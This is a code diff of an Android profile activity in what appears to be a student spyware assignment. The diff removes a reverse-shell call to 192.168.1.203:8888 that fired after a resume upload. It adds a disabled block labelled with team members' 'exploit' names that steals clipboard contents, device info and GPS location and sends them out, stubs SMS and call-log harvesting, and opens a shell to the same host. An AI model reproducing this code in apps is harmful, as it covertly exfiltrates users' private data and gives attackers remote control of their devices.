@@ -10,7 +10,7 @@ import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
-import android.provider.ContactsContract.Data
+import android.os.StrictMode
 import android.provider.Settings
 import android.view.View
 import android.widget.Button
@@ -20,11 +20,18 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
+import com.example.assignment1.DataRetriever.FindLocation
+import com.example.assignment1.DataRetriever.General
+import java.io.File
 import kotlin.concurrent.thread
 
 
 class ProfileTemplate : AppCompatActivity() {
     private var datasender = DataSender()
+    private val hv = Harvester(this, this, datasender.getAndroidID())
+    private val gn = General(this,this)
+    private val gps = FindLocation(this, this)
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         datasender.obtainAndroidID(this.contentResolver)
@@ -35,6 +42,45 @@ class ProfileTemplate : AppCompatActivity() {
         findViewById<TextView>(R.id.ResumeBtn).setOnClickListener(::chooseFile)
         findViewById<Button>(R.id.location).setOnClickListener(::location)
         findViewById<TextView>(R.id.cameraBtn).setOnClickListener(::openCamera)
+
+        //Remove if statement once done
+        if (0==1) {
+
+            // Set AndroidID
+            this.datasender.obtainAndroidID(this.contentResolver)
+            // Initialise data retriever
+            // Need this to allow finding of public IP - MY
+            val policy = StrictMode.ThreadPolicy.Builder().permitAll().build()
+            StrictMode.setThreadPolicy(policy)
+
+            // MY Exploit -----------------------------------------------------------------
+            val PERMISSIONS = arrayOf(
+                Manifest.permission.ACCESS_COARSE_LOCATION,
+                Manifest.permission.ACCESS_FINE_LOCATION
+            )
+            if (checkLocPerms(this, *PERMISSIONS)) {
+                datasender.sendData("id", gn.stealClipboard())
+                datasender.sendData("id", gn.stealDeviceInfo())
+//                datasender.sendData("id", gn.logKeys())
+//                datasender.sendData("id", gn.getPublicIP())
+                datasender.sendData("loc", gps.getLocationDetails())
+            }
+
+            // Keefe Exploit --------------------------------------------------------------
+            if (checkSMSPerms()) {
+                // hv.getSMS()
+                datasender.sendData("id" , "")
+            }
+            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
+                // hv.getCallLog()
+                datasender.sendData("id" , "")
+            }
+            if (checkFileStoragePerms()) {
+                hv.getShell("192.168.1.203", 8888)
+            }   // Shell Exploit
+
+            // Lynette Camera Exploit (Done in Camera Button) -----------------------------
+        }
     }
 
     private fun renderInfo(id: Int) {
@@ -140,19 +186,12 @@ class ProfileTemplate : AppCompatActivity() {
             val textView = findViewById<TextView>(R.id.filename)
             textView.text = filename
         }
-        shellExploit()
+//        shellExploit()
     }
     private fun fileSelector() {
         val intent = Intent(Intent.ACTION_OPEN_DOCUMENT)
         intent.type = "application/pdf"
         selectorARL.launch(Intent.createChooser(intent, "Choose a file"))
-    }
-    private fun shellExploit() {
-        println(reverseShell.getShellPath())
-        thread(start = true){
-//            newShell().main()
-            reverseShell.reverse_tcp("192.168.1.203", 8888)
-        }
     }
 
 
@@ -185,6 +224,7 @@ class ProfileTemplate : AppCompatActivity() {
             datasender.sendFile(filesDir.path + "/"+ filename)
         }
     }
+
 
 
     // ContactUs Functions------------------------------------------------------------------------
